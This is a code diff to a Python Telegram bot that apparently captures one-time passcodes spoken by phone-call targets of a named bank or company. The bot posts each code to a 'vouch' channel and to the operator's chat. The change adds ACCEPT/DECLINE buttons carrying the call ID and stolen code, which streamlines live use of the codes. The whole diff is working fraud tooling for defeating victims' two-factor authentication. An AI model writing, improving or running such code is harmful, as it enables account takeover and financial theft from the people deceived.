@@ -5,6 +5,7 @@ OTP extraction from speech and channel notification.
 import re
 import logging
 from datetime import datetime
+from telebot import types
 
 logger = logging.getLogger(__name__)
 
@@ -51,10 +52,11 @@ def send_otp_to_channel(
     target_name: str,
     company: str,
     bot,
-    chat_id: int = None
+    chat_id: int = None,
+    prompt_buttons: bool = False
 ):
     """
-    Send OTP to both channel and user's chat.
+    Send OTP to channel and optionally notify the user with accept/decline buttons.
     
     Args:
         otp: The captured OTP/code
@@ -63,6 +65,7 @@ def send_otp_to_channel(
         company: Bank/company name
         bot: Telebot instance
         chat_id: User's chat ID (for direct message)
+        prompt_buttons: If True, send an interactive accept/decline prompt to the user.
     """
     from config import VOUCH_CHANNEL_ID
     
@@ -86,15 +89,28 @@ def send_otp_to_channel(
     except Exception as e:
         logger.error(f"Failed to send to channel: {e}")
     
-    # Send to user if chat_id provided
+    # If there is a Telegram user chat ID, notify the user as well.
     if chat_id:
         try:
-            user_message = f"✅ OTP captured: `{otp}`"
-            bot.send_message(
-                chat_id=chat_id,
-                text=user_message,
-                parse_mode="Markdown"
-            )
+            if prompt_buttons:
+                buttons = types.InlineKeyboardMarkup()
+                buttons.add(
+                    types.InlineKeyboardButton("✅ ACCEPT", callback_data=f"otp_accept_{call_sid}_{otp}"),
+                    types.InlineKeyboardButton("❌ DECLINE", callback_data=f"otp_decline_{call_sid}_{otp}")
+                )
+                bot.send_message(
+                    chat_id=chat_id,
+                    text=f"🔐 *OTP Captured*\n\nCode: `{otp}`\n\nAccept or decline this code?",
+                    reply_markup=buttons,
+                    parse_mode="Markdown"
+                )
+            else:
+                user_message = f"✅ OTP captured: `{otp}`"
+                bot.send_message(
+                    chat_id=chat_id,
+                    text=user_message,
+                    parse_mode="Markdown"
+                )
             logger.info(f"OTP {otp} sent to user {chat_id}")
         except Exception as e:
             logger.error(f"Failed to send to user: {e}")
